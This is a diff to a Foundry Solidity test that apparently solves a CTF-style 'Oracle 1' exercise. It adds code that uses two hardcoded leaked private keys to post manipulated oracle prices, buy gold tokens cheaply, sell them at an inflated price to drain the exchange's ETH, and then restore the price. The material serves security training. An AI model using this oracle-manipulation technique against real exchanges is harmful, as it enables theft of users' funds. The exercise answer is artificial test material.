@@ -16,15 +16,15 @@ contract TestOM1 is Test {
     address deployer = makeAddr("deployer");
     address attacker = makeAddr("attacker");
 
-    uint256 constant EXCHANGE_INITIAL_BALANCE = 1800 ether; 
-    uint256 constant INITIAL_GOLD_PRICE = 1.5 ether; 
-    
+    uint256 constant EXCHANGE_INITIAL_BALANCE = 1800 ether;
+    uint256 constant INITIAL_GOLD_PRICE = 1.5 ether;
+
     GoldToken token;
-	GoldOracle oracle;
-	GoldExchange exchange;
+    GoldOracle oracle;
+    GoldExchange exchange;
 
     uint256 initialAttackerBalance;
-    
+
     function setUp() public {
         /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
@@ -59,18 +59,46 @@ contract TestOM1 is Test {
     }
 
     function testOracle1Exploit() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
 
+        // Leaked keys =
+        uint256 key1 = 0x221b93d924f48fcf998c7f20b4be36d12eb1d637a8f49e6e76c154f105e882af;
+        uint256 key2 = 0x390e61fd668d2cf6db3305df8dc5366ed53d58610cee715c57dfd9f780579344;
 
-        /** SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE */
+        vm.broadcast(key1);
+        oracle.postPrice(1 ether);
+
+        vm.broadcast(key2);
+        oracle.postPrice(1 ether);
+
+        vm.prank(attacker);
+
+        exchange.buyTokens{value: attacker.balance}(1);
+
+        vm.broadcast(key1);
+        oracle.postPrice(EXCHANGE_INITIAL_BALANCE + initialAttackerBalance);
+
+        vm.broadcast(key2);
+        oracle.postPrice(EXCHANGE_INITIAL_BALANCE + initialAttackerBalance);
+
+        vm.prank(attacker);
+        exchange.sellTokens(1);
+
+        vm.broadcast(key2);
+        oracle.postPrice(INITIAL_GOLD_PRICE);
+        /**
+         * SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE
+         */
 
         // Exchange lost almost all ETH
         assertLe(address(exchange).balance, 0.1 ether);
 
-		// Attacker's earned a lot of ETH on top of the exchange
+        // Attacker's earned a lot of ETH on top of the exchange
         assertGt(attacker.balance, initialAttackerBalance + EXCHANGE_INITIAL_BALANCE - 0.2 ether);
 
-		// Gold price shouldn't have changed
+        // Gold price shouldn't have changed
         assertEq(oracle.getPrice(), INITIAL_GOLD_PRICE);
     }
 }
